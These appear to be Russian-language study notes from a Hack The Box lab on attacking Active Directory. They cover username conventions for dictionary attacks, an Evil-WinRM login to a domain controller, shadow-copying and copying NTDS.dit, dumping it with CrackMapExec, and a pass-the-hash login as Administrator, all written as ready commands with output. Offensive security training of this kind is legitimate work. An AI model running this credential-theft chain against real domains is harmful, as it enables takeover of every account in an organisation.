![[Pasted image 20230509225201.png]]

## Dictionary Attacks against AD accounts using CrackMapExec
Username Convention

Practical Example for Jane Jill Doe

`firstinitiallastname`                            `jdoe`

`firstinitialmiddleinitiallastname`   `jjdoe`

`firstnamelastname`                                 `janedoe`

`firstname.lastname`                               `jane.doe`

`lastname.firstname`                               `doe.jane`

`nickname`                                                 `doedoehacksstuff`

#### Подключение к DC с помощью Evil-WinRM

```shell-session
lizergindoma@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Проверка членства в локальной группе
```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

#### Проверка привилегий учетной записи пользователя, включая домен
```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
```

#### Создание теневой копии C:
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Копирование NTDS.dit из VSS
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

#### Более быстрый метод: использование cme для захвата NTDS.dit
```shell-session
lizergindoma@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

#### Пример передачи хеша с помощью Evil-WinRM
```shell-session
lizergindoma@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
